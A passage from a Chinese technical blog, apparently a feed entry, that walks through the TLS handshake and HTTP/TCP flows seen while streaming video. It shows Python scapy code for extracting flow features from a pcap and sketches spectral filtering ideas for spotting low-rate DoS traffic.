TCP 三次握手</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611757877043-bb59f72b-941a-4cf1-b0cd-b5cc41df8267.png#align=left&display=inline&height=45&name=image.png&originHeight=69&originWidth=1141&size=10848&status=done&style=none&width=746" alt="image.png"></p><ul><li>然后进行 ssl 层的 tls 连接。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611757973347-d217e98f-adde-401d-b8b7-153f357a3b47.png#align=left&display=inline&height=53&name=image.png&originHeight=91&originWidth=1287&size=15828&status=done&style=none&width=746" alt="image.png"></p><ol><li><strong>Client Hello</strong><ol><li><strong>Client Hello</strong> 报文：客户端对加密算法的支持度不同，因此需要<strong>向服务端发送</strong>客户端支持的<strong>加密套件（Cipher Suite）</strong> ，同时还要生成一个 <strong>随机数</strong> 同时保存在客户端和发送给服务</li></ol></li><li><strong>Server Hello</strong><ol><li><strong>ServerCertificate</strong> 报文：服务端收到 Client Hello 之后，向客户端发送 <strong>CA 认证的数字证书</strong>，用来鉴别服务端身份信息，同时还要生成一个 <strong>随机数</strong> 同时保存在服务端和发送给客户端</li><li><strong>Server Hello Done</strong> 报文：表示服务端宣告第一阶段的客户端服务端握手协商结束</li><li>可选：<strong>Certificate Request</strong> 报文：必要情况下，要求客户端发送证书验证身份</li><li>可选：<strong>Server Key Exchange</strong> 报文：如果 CA 认证的数字证书提供的信息不够，服务端还可发送提供补充信息</li></ol></li><li><strong>Client Finish</strong><ol><li><strong>Client Key Exchange</strong> 报文：客户端收到 CA 数字证书并通过验证，然后通过 CA 公钥解密获取到 <strong>服务端公钥</strong>。Client Key Exchange 报文包括有一个随机数，这个随机数被称为 <strong>Pre-master key/secret</strong>；一个表示随后的信息使用双方协商好的加密方法和密钥发送的 <strong>通知</strong> ；还有一个通过协商好的 HASH 算法对前面所有信息内容的 <strong>HASH 计算值</strong>，用来提供服务端校验。这些信息都通过服务端公钥加密传送给服务端</li><li><strong>ClientCipherSpec</strong> 报文：该报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥进行加密通信（也就是使用两个随机数以及第三个 Pre-master key/secret 随机数一起算出一个对称密钥 <strong>session key/secret</strong>）</li><li><strong>Finished</strong> 报文：该报文包括连接至此的所有报文的校验值，使用服务端公钥进行加密</li><li>可选：<strong>ClientCertificate</strong> 报文：如果服务端请求，客户端需要发送 CA 数字证书</li><li>可选：<strong>CertificateVerify</strong> 报文：服务端如果要求 CA 数字证书，那么需要通过 HASH 算法计算一个服务端发送来的信息摘要</li></ol></li><li><strong>Server Finish</strong><ol><li>服务端最后对客户端发送过来的 <strong>Finished</strong> 报文使用服务端私钥进行解密校验</li><li><strong>ClientCipherSpec</strong> 报文：报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥 session key/secret 进行加密通信</li><li><strong>Finished</strong> 报文：标志 TLS 连接建立成功</li></ol></li><li>TLS 握手成功此后通过对称密钥 session key/secret 加密通信</li></ol><ul><li>然后开始 http 请求对话，这里发出一个 GET 请求</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612014025092-c856c9a3-2c51-42c0-8b4b-435964921996.png#align=left&display=inline&height=33&name=image.png&originHeight=65&originWidth=1572&size=15127&status=done&style=none&width=786" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611758223554-e837ea42-932b-4d10-a04c-979a2ad07293.png#align=left&display=inline&height=366&name=image.png&originHeight=474&originWidth=817&size=61104&status=done&style=none&width=631" alt="image.png"><br>可以看到目标 host 格式为 v.smtcdns.com，可见是一个 cdn 节点。<br>然后就是 TCP 流<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611758446338-edda4928-3e49-4845-8ffd-6ff40b48bf5a.png#align=left&display=inline&height=223&name=image.png&originHeight=362&originWidth=1024&size=46560&status=done&style=none&width=631" alt="image.png"><br>这里无法解析 TCP 的报文具体信息，应该就是相应的视频流。<br>在所有 tcp 分片发完之后，然后服务器发送一个 http 200,返回的内容是 video,采用 MP2T 编码。<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612014103338-752dc6c7-7225-40ca-8136-445428457c5b.png#align=left&display=inline&height=21&name=image.png&originHeight=41&originWidth=1459&size=7797&status=done&style=none&width=729.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611758370557-66d94b81-52b8-4463-94b6-84e2dc7f71a9.png#align=left&display=inline&height=333&name=image.png&originHeight=435&originWidth=702&size=40911&status=done&style=none&width=537" alt="image.png"><br>然后再次重复上面的过程。<br>整个观看视频过程中产生的 http 报文过滤后如下<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611758616294-fbb2270c-e9a1-4ae2-9549-45ee74b218fd.png#align=left&display=inline&height=228&name=image.png&originHeight=347&originWidth=1053&size=44535&status=done&style=none&width=693" alt="image.png"></p><h1 id="使用-python-进行自动化分析与特征提取"><a href="#使用-python-进行自动化分析与特征提取" class="headerlink" title="使用 python 进行自动化分析与特征提取"></a>使用 python 进行自动化分析与特征提取</h1><p>【1】<a href="https://github.com/SewellDinG/scapy-ssl_tls-demo">https://github.com/SewellDinG/scapy-ssl_tls-demo</a><br>【2】<a href="https://github.com/hackers-terabit/scapy-ssl_tls-python3">https://github.com/hackers-terabit/scapy-ssl_tls-python3</a><br>【3】<a href="http://blog.whiterabbitxyj.com/2017/11/07/python-scapy/">http://blog.whiterabbitxyj.com/2017/11/07/python-scapy/</a><br>【4】<a href="https://wizardforcel.gitbooks.io/scapy-docs/content/3.html">https://wizardforcel.gitbooks.io/scapy-docs/content/3.html</a><br>【5】<a href="https://www.osgeo.cn/scapy/layers/http.html">https://www.osgeo.cn/scapy/layers/http.html</a><br>【6】<a href="https://www.osgeo.cn/scapy/usage.html">https://www.osgeo.cn/scapy/usage.html</a><br>【7】<a href="https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html">https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html</a><br>首先，scapy 在 2.4.0 已经开始支持 http 和 tls 的解析，但是在默认配置中没有添加，可以通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<br>load_layer(<span class="hljs-string">&#x27;tls&#x27;</span>)<br>load_layer(<span class="hljs-string">&#x27;http&#x27;</span>)<br></code></pre></td></tr></table></figure><p>进行手动导入。</p><blockquote><p>这里真的坑了我好久，我一直在安装那个 tls 的补充包，但安不上，读了很多文档才琢磨出来</p></blockquote><p>不过也仅仅是能解析到 tls 层，而 http 层由于加密仍然无法解析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">###[ Ethernet ]###</span><br>  dst       = <span class="hljs-number">54</span>:a7:<span class="hljs-number">03</span>:d3:a3:<span class="hljs-number">91</span><br>  src       = <span class="hljs-number">42</span>:<span class="hljs-number">23</span>:<span class="hljs-number">09</span>:<span class="hljs-number">71</span>:f5:<span class="hljs-number">85</span><br>  type      = IPv4<br><span class="hljs-comment">###[ IP ]###</span><br>     version   = <span class="hljs-number">4</span><br>     ihl       = <span class="hljs-number">5</span><br>     tos       = <span class="hljs-number">0x0</span><br>     len       = <span class="hljs-number">1033</span><br>     id        = <span class="hljs-number">21817</span><br>     flags     = DF &lt;--对应分片<br>     frag      = <span class="hljs-number">0</span><br>     ttl       = <span class="hljs-number">128</span><br>     proto     = <span class="hljs-number">6</span><br>     chksum    = <span class="hljs-number">0x9daf</span><br>     src       = <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span><br>     dst       = <span class="hljs-number">60.233</span><span class="hljs-number">.5</span><span class="hljs-number">.16</span><br>     \options   \<br><span class="hljs-comment">###[ TCP ]###</span><br>        sport     = <span class="hljs-number">50503</span><br>        dport     = <span class="hljs-number">443</span><br>        seq       = <span class="hljs-number">1900018089</span><br>        ack       = <span class="hljs-number">3368278776</span><br>        dataofs   = <span class="hljs-number">8</span><br>        reserved  = <span class="hljs-number">0</span><br>        flags     = PA &lt;--对应SYN, FIN, ACK, PSH, RST, URG<br>        window    = <span class="hljs-number">4116</span><br>        chksum    = <span class="hljs-number">0xe752</span><br>        urgptr    = <span class="hljs-number">0</span><br>        options   = [(<span class="hljs-string">&#x27;NOP&#x27;</span>, <span class="hljs-literal">None</span>), (<span class="hljs-string">&#x27;NOP&#x27;</span>, <span class="hljs-literal">None</span>), (<span class="hljs-string">&#x27;Timestamp&#x27;</span>, (<span class="hljs-number">2543536</span>, <span class="hljs-number">2295788294</span>))]<br><span class="hljs-comment">###[ TLS ]###</span><br>           type      = application_data<br>           version   = TLS <span class="hljs-number">1.2</span><br>           len       = <span class="hljs-number">976</span>    [deciphered_len= <span class="hljs-number">976</span>]<br>           iv        = <span class="hljs-string">b&#x27;&#x27;</span><br>           \msg       \<br>            |<span class="hljs-comment">###[ TLS Application Data ]###</span><br>            |  data      = <span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x02\xf4\xae\x1e\x90P\x058\x0bd\xae\xae\x14\x86\xfd\xb4\x19\xb3E\xc3\x86\x1fg\xf5\x8a)\xdf@\xe4\xf0|Q%Ay\xb3\xb0^\xf1\xe2\r\xb3\xf7\xb0\xab\xb5eFe@\xe3\x9c\xf5o\xaa\xb3\x13\x8d\xc9^G\x10\xc7\x90\xf5\xe7FM\x80\xfcAH\xf88\xf5\xea\x86K%EB\xbft\xc23\xbavv\xae\xda\xbf\x07\x90\xc6\x12\x1f\x81v\xcdl\xd3\xb0\xe7p\xcf\xb1\xac\xceK\x1f\xdf4\xbb\xbc\x93\x81E\xdd\xda\x96\xd0\xae+\x80\xb3\x8e\x84\xdf^&quot;ig]w\xc0\xe8P\x92\x1a!3\xca\xb4\x0b\xc3\x83&lt;B\x10\x80\xa5\xeb9F\xde\xbc\xf1\xf6\x91\xaac\x15\x85\xc7rs\xfeP0\x15\x02H~Ba\x104\x89~MP&lt;x\xbc\xfe$|\xd6\x9de\xff\x9b\xfe\x11\xf2]\x87\xa9\xc1\x84yT\xe9R*\x9cVP-Q\x15\xeb\x99\xde@\xc4,\xads\xb1\xcd\x8f\xcb\x9e\xe8@PE\xdd\xab\x1b*\xd1I-\x96Oa\x8e\xc5\xbest\xd0\xbe\x03&#123;r\xe3f\x17\xebx\xbd\x8b\xde~B&amp;\xfe&quot;\xa9d\xd4\xdaZH|\xce\xdb$\xe2P7F\x83\x14\xa0i\x8f\x9a\xe5VL\xf9\x87U\x94\xf8\xe3]\xfd[\x84(\rOs\xc9CG\x9d\xe8\x8eo,\xed\x94\xe0\xfaT\x87\x9d\xe1e\x8d\xea\x19+\xed\x0b\xf9\xea\x8d\xdc\xca\x0c\xa8\x85_\x9aF\xaanF\xa6b\xd0\xc0\xe4B\xdb\xec\x13[\x14)\xcc\x7f\xb0\x83\xe7\xae\xb5b\x04;y\x83ZE\x19C\x18\x01#e\xc8f\xb7@\x86\xae\xd8u\x944f\xe1\x82\xec\xe8]\x0c\x8f&amp;\x8c\x9d\xe5&lt;\x88J2\xc4&quot;\rev&quot;\xe1@\x05\xbc\xc2\x7f\x98\x07\xae\x9e\xab\xa9\x892`%\xe7\xecxX\xb94\xb8:\xf3\xa3\x07\x18\xe4\xe9\x99N\xf0\xc3\x85\xca\xbe\x93\xc0~\xe6\xa5\xbaf\xc1\xdc\&#x27;\xb6\xf1W\xcf\xb7\x06\xf4`\x1d\xc4\xe6|\xd1\xd1\x05\x7f\x8f\x9d\x8c\xb5&amp;\x8btr\xc5=\xe0\x9f\xb4S\x93&lt;\x96/\xb8\xd1CE\x10\x82\x8a\xf7\xef\x9b\x81h\xa5y(\xedw\xe4[o\xaa\x1c\xe6\xed\xf0\xaa\x82t\xc5;\x8a\nk\x9a\xe1&lt;\xc6\x03L\xd8\xc1S\xd2\x08\x08\xaf\xa54%\xed\xed\xc8*\x95\xd4\xfd\xf8\xf9D\xdf6\x16\xf8\x11\t?\xbc\xe7\x1e\xcc&lt;\xff\xda\xe9\xa6\xd8 l\x83\xe8\xd93?C#&#125;7KI\xdeVt$\xa5\xdc\xba\x0fL\x9b\x19(\t\xb5U\xd5\x82\xc0*\xb7\xf2\xda2dW!\x7fRF\xcf\xa6Qk\xcfD\xf8G\xac\xee\xe8F\xe6\x8e(Q\x91\xd9\xeb^C\xb3I\xea\n\xc1\xd84\xd4\x9d\xcc=Yt\xf0&quot;|xo\xb4p\xaf\xc85\xad\r\xd4&amp;\xd9\xbd\x85\x8b&gt;Tv\\\x06\x19@G\x0f\xfdF\x7f\x174M+\x17/7\xb7\xe8!T\xf5h\xf3\xffQ\xdd\x1e\xfc\xe5\xc4L`\xf5\x12T\x14\xb1\\\xd3F\xb1\x95\xab)\x1at\xc0$\xca\x00\xf46\xc8\xc0\x94\xab(g\xb7.\xcf\xa0|%\xfe\xa6\xb2UJ\xbd\x1eZ2w2H(\xedz&gt;\x02\x11\xb2;\xbe\xe1\x1c\xc6\xe2\xfa\xb6\x19\xd5\xc0\xe2Z\x16\x87O8\xdcs\&#x27;\xc1:\xc8\xd4\x9e&amp;o\xc5\x1b;\x86\xb2\x00\xe50\xba&lt;\xbe\xa8\x14\xd2\xc9\xe7\xc1#\&#x27;\x8e\xaa\x82\xc9\xf1\xd0\xdak\xe5DS\x95\xc3k\x8f\xf1\xdaa\xbdC\xb2\xadk\x04\x024\\)\xa9\x86X\x0e\x99h\x93\xf8\x88\xba\xaf\x9f\xb6X(\xcep\xd3\x87\xba=\tr1k`&quot;\x94$4A\xf9(\x1e\xa9\x9f\x83\x8f\xe8YVOK\xa8_&#125;\xc0)-\x14\xf1\x15V[j,\xd3`\xa0\xeaD\xa2\x08N!\xd1\x92\xb8\xe0D\x86K.\xf8\xcfGb\x943mGB\x9b,~\xe4\xcdR\xd4s\x19\xd5\xfeb\x94\xd7u\xcd\xc5\xa4\x1f\xfbBS\x0c\x8e\x06\xf2\x95\xd05\x80\x08\xbdh\xbb\xd6\xe4\x04&amp;\xc4&#123;\x12&#125;\&#x27;-\xc7O&#125;]\xbd\xd0\xf8\xaep\x9c\xb6\rH\x0e6,\xab\xb0\xf3k\x00\xb4\x16\x04\x1b\x13:,=\x8d\xbf\x99\x03&#x27;</span><br>           mac       = <span class="hljs-string">b&#x27;&#x27;</span><br>           pad       = <span class="hljs-string">b&#x27;&#x27;</span><br>           padlen    = <span class="hljs-literal">None</span><br><br><span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>暂时没有找到如何像 wireshark 一样可以实时绑定密钥进行会话解密的 python 命令行方式，所以提取特征只限制在 tls 层及以下。也就是说，诸如 http 的状态码，请求类型，实体内容类型都无法解析</p><h2 id="提取特征"><a href="#提取特征" class="headerlink" title="提取特征"></a>提取特征</h2><p>首先，确定提取的特征名称。<br>首先是五元组特征：(源 IP,目的 IP,源端口,目的端口,协议类型）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">feature_name=[<span class="hljs-string">&#x27;fiat_mean&#x27;</span>,<span class="hljs-string">&#x27;fiat_min&#x27;</span>,<span class="hljs-string">&#x27;fiat_max&#x27;</span>,<span class="hljs-string">&#x27;fiat_std&#x27;</span>,<span class="hljs-string">&#x27;biat_mean&#x27;</span>,<span class="hljs-string">&#x27;biat_min&#x27;</span>,<span class="hljs-string">&#x27;biat_max&#x27;</span>,<span class="hljs-string">&#x27;biat_std&#x27;</span>,<br>             <span class="hljs-string">&#x27;diat_mean&#x27;</span>,<span class="hljs-string">&#x27;diat_min&#x27;</span>,<span class="hljs-string">&#x27;diat_max&#x27;</span>,<span class="hljs-string">&#x27;diat_std&#x27;</span>,<span class="hljs-string">&#x27;duration&#x27;</span>,<span class="hljs-string">&#x27;fwin_total&#x27;</span>,<span class="hljs-string">&#x27;fwin_mean&#x27;</span>,<span class="hljs-string">&#x27;fwin_min&#x27;</span>,<br>             <span class="hljs-string">&#x27;fwin_max&#x27;</span>,<span class="hljs-string">&#x27;fwin_std&#x27;</span>,<span class="hljs-string">&#x27;bwin_total&#x27;</span>,<span class="hljs-string">&#x27;bwin_mean&#x27;</span>,<span class="hljs-string">&#x27;bwin_min&#x27;</span>,<span class="hljs-string">&#x27;bwin_max&#x27;</span>,<span class="hljs-string">&#x27;bwin_std&#x27;</span>,<span class="hljs-string">&#x27;dwin_total&#x27;</span>,<br>             <span class="hljs-string">&#x27;dwin_mean&#x27;</span>,<span class="hljs-string">&#x27;dwin_min&#x27;</span>,<span class="hljs-string">&#x27;dwin_max&#x27;</span>,<span class="hljs-string">&#x27;dwin_std&#x27;</span>,<span class="hljs-string">&#x27;fpnum&#x27;</span>,<span class="hljs-string">&#x27;bpnum&#x27;</span>,<span class="hljs-string">&#x27;dpnum&#x27;</span>,<span class="hljs-string">&#x27;bfpnum_rate&#x27;</span>,<span class="hljs-string">&#x27;fpnum_s&#x27;</span>,<br>             <span class="hljs-string">&#x27;bpnum_s&#x27;</span>,<span class="hljs-string">&#x27;dpnum_s&#x27;</span>,<span class="hljs-string">&#x27;fpl_total&#x27;</span>,<span class="hljs-string">&#x27;fpl_mean&#x27;</span>,<span class="hljs-string">&#x27;fpl_min&#x27;</span>,<span class="hljs-string">&#x27;fpl_max&#x27;</span>,<span class="hljs-string">&#x27;fpl_std&#x27;</span>,<span class="hljs-string">&#x27;bpl_total&#x27;</span>,<span class="hljs-string">&#x27;bpl_mean&#x27;</span>,<br>             <span class="hljs-string">&#x27;bpl_min&#x27;</span>,<span class="hljs-string">&#x27;bpl_max&#x27;</span>,<span class="hljs-string">&#x27;bpl_std&#x27;</span>,<span class="hljs-string">&#x27;dpl_total&#x27;</span>,<span class="hljs-string">&#x27;dpl_mean&#x27;</span>,<span class="hljs-string">&#x27;dpl_min&#x27;</span>,<span class="hljs-string">&#x27;dpl_max&#x27;</span>,<span class="hljs-string">&#x27;dpl_std&#x27;</span>,<span class="hljs-string">&#x27;bfpl_rate&#x27;</span>,<br>             <span class="hljs-string">&#x27;fpl_s&#x27;</span>,<span class="hljs-string">&#x27;bpl_s&#x27;</span>,<span class="hljs-string">&#x27;dpl_s&#x27;</span>,<span class="hljs-string">&#x27;fin_cnt&#x27;</span>,<span class="hljs-string">&#x27;syn_cnt&#x27;</span>,<span class="hljs-string">&#x27;rst_cnt&#x27;</span>,<span class="hljs-string">&#x27;pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;ack_cnt&#x27;</span>,<span class="hljs-string">&#x27;urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;cwe_cnt&#x27;</span>,<span class="hljs-string">&#x27;ece_cnt&#x27;</span>,<br>             <span class="hljs-string">&#x27;fwd_pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;fwd_urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;bwd_pst_cnt&#x27;</span>,<span class="hljs-string">&#x27;bwd_urg_cnt&#x27;</span>,<span class="hljs-string">&#x27;fp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;bp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;dp_hdr_len&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-string">&#x27;f_ht_len&#x27;</span>,<span class="hljs-string">&#x27;b_ht_len&#x27;</span>,<span class="hljs-string">&#x27;d_ht_len&#x27;</span>]<br></code></pre></td></tr></table></figure><p>其中</p><ul><li>13 个包的到达特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># feature about packet arrival interval 13</span><br>        fiat_mean,fiat_min,fiat_max,fiat_std = packet_iat(fwd_flow)<span class="hljs-comment">#正向发送的两个数据包之间的平均时间,正向发送的两个数据包之间的最短时间,正向发送的两个数据包标准偏差</span><br>        biat_mean,biat_min,biat_max,biat_std = packet_iat(bwd_flow)<span class="hljs-comment">#反向发送的两个数据包之间的平均时间,...</span><br>        diat_mean,diat_min,diat_max,diat_std = packet_iat(pkts)<span class="hljs-comment">#两次流动之间的平均时间,...</span><br>        duration = round(pkts[<span class="hljs-number">-1</span>].time - pkts[<span class="hljs-number">0</span>].time+ decimal.Decimal(<span class="hljs-number">0.0001</span>), <span class="hljs-number">6</span>) <span class="hljs-comment">#流动持续时间</span><br></code></pre></td></tr></table></figure><ul><li>15 个拥塞窗口特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 拥塞窗口大小特征 15</span><br>        fwin_total,fwin_mean,fwin_min,fwin_max,fwin_std = packet_win(fwd_flow)<br>        bwin_total,bwin_mean,bwin_min,bwin_max,bwin_std = packet_win(bwd_flow)<br>        dwin_total,dwin_mean,dwin_min,dwin_max,dwin_std = packet_win(pkts)<br></code></pre></td></tr></table></figure><ul><li>7 个包的数量特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># feature about packet num  7</span><br>        fpnum=len(fwd_flow) <span class="hljs-comment">#前向总包数</span><br>        bpnum=len(bwd_flow) <span class="hljs-comment">#反向总包数</span><br>        dpnum=fpnum+bpnum<br>        bfpnum_rate = round(bpnum / (fpnum + <span class="hljs-number">0.001</span>), <span class="hljs-number">6</span>)<br>        fpnum_s = round(fpnum / duration, <span class="hljs-number">6</span>)<br>        bpnum_s = round(bpnum / duration, <span class="hljs-number">6</span>)<br>        dpnum_s = round(dpnum / duration, <span class="hljs-number">6</span>) <span class="hljs-comment">#流数据包速率，即每秒传输的数据包数</span><br></code></pre></td></tr></table></figure><ul><li>19 个包的总长度特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包的总长度 19</span><br>        fpl_total,fpl_mean,fpl_min,fpl_max,fpl_std = packet_len(fwd_flow)<span class="hljs-comment">#正向报文总大小,正向报文的平均大小,...</span><br>        bpl_total,bpl_mean,bpl_min,bpl_max,bpl_std = packet_len(bwd_flow)<br>        dpl_total,dpl_mean,dpl_min,dpl_max,dpl_std = packet_len(pkts)<br>        bfpl_rate = round(bpl_total / (fpl_total + <span class="hljs-number">0.001</span>), <span class="hljs-number">6</span>)<br>        fpl_s = round(fpl_total / duration, <span class="hljs-number">6</span>)<br>        bpl_s = round(bpl_total / duration, <span class="hljs-number">6</span>)<br>        dpl_s = round(dpl_total / duration, <span class="hljs-number">6</span>) <span class="hljs-comment">#流字节率，即每秒传输的数据包数</span><br></code></pre></td></tr></table></figure><ul><li>12 个包的标志特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包的标志特征 12</span><br>       fin_cnt,syn_cnt,rst_cnt,pst_cnt,ack_cnt,urg_cnt,cwe_cnt,ece_cnt=packet_flags(pkts,<span class="hljs-number">0</span>)<span class="hljs-comment">#FIN的报文数,SYN报文数,...</span><br>       fwd_pst_cnt,fwd_urg_cnt=packet_flags(fwd_flow,<span class="hljs-number">1</span>)<span class="hljs-comment">#在正向传输的数据包中设置PSH标志的次数,URG标志的次数</span><br>       bwd_pst_cnt,bwd_urg_cnt=packet_flags(bwd_flow,<span class="hljs-number">1</span>)<span class="hljs-comment">#在反向传输的数据包中设置PSH标志的次数,URG标志的次数</span><br></code></pre></td></tr></table></figure><ul><li>6 个包的头部特征</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包头部长度 6</span><br>        fp_hdr_len=packet_hdr_len(fwd_flow)<br>        bp_hdr_len=packet_hdr_len(bwd_flow)<br>        dp_hdr_len=packet_hdr_len(pkts)<br>        f_ht_len=round(fp_hdr_len /(fpl_total+<span class="hljs-number">1</span>), <span class="hljs-number">6</span>)<br>        b_ht_len=round(bp_hdr_len /(bpl_total+<span class="hljs-number">1</span>), <span class="hljs-number">6</span>)<br>        d_ht_len=round(dp_hdr_len /dpl_total, <span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><p>这里介绍一种快速过滤的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<br>packets = rdpcap(<span class="hljs-string">&#x27;/content/drive/MyDrive/network_trafic_analysis/qqlarge.pcap&#x27;</span>)<br>tcp_p = packets.filter(<span class="hljs-keyword">lambda</span> x: x.haslayer(<span class="hljs-string">&#x27;TCP&#x27;</span>))<br>--------------------------------------------------<br>&lt;filtered qqlarge.pcap: TCP:<span class="hljs-number">9201</span> UDP:<span class="hljs-number">0</span> ICMP:<span class="hljs-number">0</span> Other:<span class="hljs-number">0</span>&gt;<br></code></pre></td></tr></table></figure><p>然后对于已知的流量包，去 github 上找了现成的轮子<a href="https://github.com/jiangph1001/flow-feature.git">https://github.com/jiangph1001/flow-feature.git</a>。提取效果如下。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612075914564-46ba2708-3f21-4d60-a819-203343ce4f6e.png#align=left&display=inline&height=197&name=image.png&originHeight=393&originWidth=570&size=38218&status=done&style=none&width=285" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1612075964989-174c020a-66de-45c2-93da-1d5345ddaf2f.png#align=left&display=inline&height=196&name=image.png&originHeight=414&originWidth=931&size=44543&status=done&style=none&width=440" alt="image.png"><br>可以看到，在观看视频的时间里，与服务器 ip 之间的数据流是最多的。</p><h1 id="过滤-idea"><a href="#过滤-idea" class="headerlink" title="过滤 idea"></a>过滤 idea</h1><ol><li>可以分析视频流 tcp 报文的频谱，进行傅里叶变换或者小波变换，得到正常情况下的能量谱特征。</li><li>对于 DDos 等其他攻击情况下的频谱，也可以进行相关分析。</li><li>对于正常的 TCP 流，可以使用<strong>梳状滤波器</strong>进行滤波，让 RTT 对应频带的频率通过，保证大部分正常 TCP 流量通过，然后将其余的归为灰流量。<blockquote><p>见参考文献：基于频谱分析的 LDos 攻击流量过滤方法</p></blockquote></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>在查解析 pcap 包的时候发现了这样几个仓库，感觉很棒。<br>Joy <a href="https://github.com/cisco/joy">https://github.com/cisco/joy</a><br>相关使用可参考<a href="https://flashgene.com/archives/70939.html">https://flashgene.com/archives/70939.html</a><br><a href="https://www.freebuf.com/sectool/161431.html">https://www.freebuf.com/sectool/161431.html</a><br>官方文档<a href="https://github.com/cisco/joy/blob/master/doc/using-joy-05.pdf">https://github.com/cisco/joy/blob/master/doc/using-joy-05.pdf</a><br>更详细的使用可以见<a href="https://github.com/cisco/joy/wiki">https://github.com/cisco/joy/wiki</a>，里面包括了搭建，捕获，特征提取的全过程</p><p><a href="https://asmcn.icopy.site/awesome/awesome-pcaptools/">https://asmcn.icopy.site/awesome/awesome-pcaptools/</a><br>这个是收录的所有和 pcap 相关的工具，包括抓取，解析，提取特征。而这个站点，真的是一个宝藏站点，里面啥都有…真的太强了。<br><a href="https://asmcn.icopy.site/awesome/awesome-network-analysis/#software">https://asmcn.icopy.site/awesome/awesome-network-analysis/#software</a> 比如这个就是网络分析相关的软件大全（图论相关）</p>]]></content>
      
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
            <tag> 视频流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-faster-pandas-skills</title>
      <link href="/2021/python-faster-pandas-skills/"/>
